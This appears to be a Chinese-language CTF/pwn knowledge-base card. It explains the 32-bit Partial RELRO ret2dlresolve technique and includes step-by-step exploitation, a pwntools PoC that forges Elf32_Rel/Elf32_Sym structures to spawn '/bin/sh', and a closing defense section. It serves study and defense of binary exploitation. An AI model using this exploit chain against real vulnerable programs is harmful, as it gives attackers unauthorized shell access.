---
id: binary-pwn-stack-ret2dlresolve-partial-relro-32-fake-reloc
title: 32 位 Partial RELRO 伪造 reloc_arg 与动态符号结构 ret2dlresolve
type: scenario
domain: binary
path: binary/pwn/stack
technique: ret2dlresolve
aliases:
- fake reloc ret2dlresolve
- 伪造 Elf32_Rel
- 大偏移 reloc_arg
- partial relro ret2dlresolve
tags:
- pwn
- stack
- rop
- ret2dlresolve
- partial-relro
- elf32
- dynsym
- version-check
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: orchestrator-fix
  verified_at: '2026-11-05T20:01:47+08:00'
  notes: V98 指出问题已按原文修正：假 Sym 改为相对 .dynsym 的 16 字节对齐公式
---

## 一句话结论

Partial RELRO 使 `.dynamic` 只读、无法改写 `DT_STRTAB`，但栈上的 `reloc_arg` 仍可控：用越界的大 `reloc_arg` 把 `_dl_fixup` 的取表指针引到 `.bss` 中伪造的 `Elf32_Rel`、`Elf32_Sym` 和字符串上，就能让动态链接器把目标函数名解析成 `system`，在无 libc 泄漏时完成 getshell。

## 原理

`_dl_fixup` 的查表公式为：

1. `reloc = DT_JMPREL + reloc_arg`；
2. `sym = &DT_SYMTAB[R_SYM(reloc->r_info)]`；
3. 函数名 = `DT_STRTAB + sym->st_name`。

三个表基址来自只读的 `.dynamic` 无法改动，但 `reloc_arg` 来自 PLT 压栈（或攻击者直接构造的栈），可以任意大。把 `reloc_arg` 设为 `fake_reloc - DT_JMPREL`，`reloc` 就落到 `.bss` 的假 `Elf32_Rel` 上；在假项中把 `r_info` 低 8 位填 `7`（`R_386_JMP_SLOT`）以通过断言，高 24 位填假符号索引 `sym_index = (fake_sym - DT_SYMTAB) / 16`；在 `DT_SYMTAB + sym_index*16` 处放假 `Elf32_Sym`，令 `st_other & 3 == 0` 通过可见性检查，`st_name = fake_str - DT_STRTAB`；紧随其后写入 `system\0`。动态链接器据此按 `system` 查符号，将真实地址写回 `r_offset` 指定的 GOT 项并跳转执行。

版本检查是主要障碍：glibc 会用 `vernum[R_SYM(r_info)] & 0x7fff` 取版本索引，假符号索引过大时该数组越界读取；若读到的 `version->hash` 为 0，则 `version = NULL` 跳过校验。通过微调 `base_stage`，让越界索引恰好落在内存中值为 0 的位置（原文示例为 `0x080487C2`），即可避免崩溃。32 位下 `reloc_arg` 是字节偏移；64 位下 `Elf64_Rela` 为 24 字节，`reloc_arg` 需按 24 整除，且巨大索引更容易在版本检查处崩溃。

## 触发条件

- 32 位 ELF，Partial RELRO（`.dynamic` 只读、`.got.plt` 可写），NX 开启；
- 栈溢出可控返回地址；
- 能把伪造结构写入地址已知的可写段（通常 `.bss`）；栈空间不够时先做栈迁移；
- 非 PIE 或已知各节地址，便于计算 `rel_plt`、`dynsym`、`dynstr` 和`.bss` 地址。

## 利用步骤

1. 栈迁移（可选但常见）：第一段 ROP 调用 `read(0, base_stage, N)` 把后续 payload 写入 `.bss`，再用 `leave; ret` 把栈迁到 `base_stage`。
2. 在 `base_stage + 24` 构造假 `Elf32_Rel`：`r_offset` 填一个可写 GOT（如 `write@got`），`r_info = (sym_index << 8) | 7`。
3. 在 `base_stage + 32` 之后按 16 字节对齐构造假 `Elf32_Sym`：`st_name = fake_str - dynstr`，`st_info = 0x12`，`st_other = 0`；紧接结构体写入 `system\0`。
4. 计算 `reloc_arg = (base_stage + 24) - rel_plt`；若版本检查越界，按 `(zero_addr - vernum_base) / 2 * 16` 调整 `base_stage`，使越界索引落到值为 0 的位置。
5. ROP 布局：`plt0`、`reloc_arg`、假返回地址、`system` 参数指针（指向 `/bin/sh`），再放伪造 Rel/Sym 与字符串。
6. 触发后 `_dl_fixup` 查到 `system` 并跳转，`/bin/sh` 作为参数执行，得到 shell。

## PoC

32 位核心构造（省略栈迁移前置链；`base_stage` 含版本检查对齐修正）：

```python
from pwn import *
elf = ELF('./partial_relro_32')
base_stage = elf.bss() + 0x800 + (0x080487C2 - 0x080487A8) // 2 * 0x10
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym  = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr  = elf.get_section_by_name('.dynstr').header.sh_addr
plt0    = elf.get_section_by_name('.plt').header.sh_addr

fake_sym = base_stage + 32
fake_sym += 0x10 - ((fake_sym - dynsym) & 0xf)
sym_idx  = (fake_sym - dynsym) // 0x10
st_name  = fake_sym + 0x10 - dynstr
fake_rel = flat(elf.got['write'], (sym_idx << 8) | 7)
fake_sym_data = flat(st_name, 0, 0, 0x12)

rop = ROP(elf)
rop.raw(plt0)
rop.raw((base_stage + 24) - rel_plt)   # 伪造 reloc_arg
rop.raw(0xdeadbeef)
rop.raw(base_stage + 80)               # system 参数 /bin/sh
rop.raw(fake_rel)
rop.raw(b'A' * (fake_sym - (base_stage + 32)))
rop.raw(fake_sym_data)
rop.raw(b'system\x00')
rop.raw(b'A' * (80 - len(rop.chain())))
rop.raw(b'/bin/sh\x00')
```

实际利用先用 `read(0, base_stage, N)` + `leave; ret` 完成迁移，再发送上面这段 payload。pwntools 的 `Ret2dlresolvePayload` 可自动完成大部分计算。

## 变体与关联

- 64 位变体：结构改为 `Elf64_Rela`（24 字节），`reloc_arg` 需按 24 整除；巨大 `sym_index` 在 `DT_VERSYM` 处越界更容易崩溃。可先泄漏 `link_map` 地址并把 `link_map+0x1c8` 置非 0，再按本手法伪造结构；或直接伪造整个 link_map（见关联卡）。
- 关联：No RELRO 改写 `DT_STRTAB`、64 位伪造 link_map、栈迁移、ret2csu、pwntools `Ret2dlresolvePayload`。
- 该手法同样适用于 64 位但需额外处理版本检查与 8 字节结构对齐。

## 检测与防御

- 启用 Full RELRO + BIND_NOW，彻底关闭延迟绑定，`_dl_fixup` 不再参与运行期解析。
- 启用 PIE + ASLR，隐藏 `.rel.plt`、`.dynsym`、`.dynstr` 与 `.bss` 地址。
- 运行期检测异常大的 `reloc_arg`、`.bss` 中出现形似 `Elf_Rel/Elf_Sym` 的结构、以及 GOT 被解析到非预期符号。
- seccomp 限制 `execve`，降低拿 shell 后的影响。
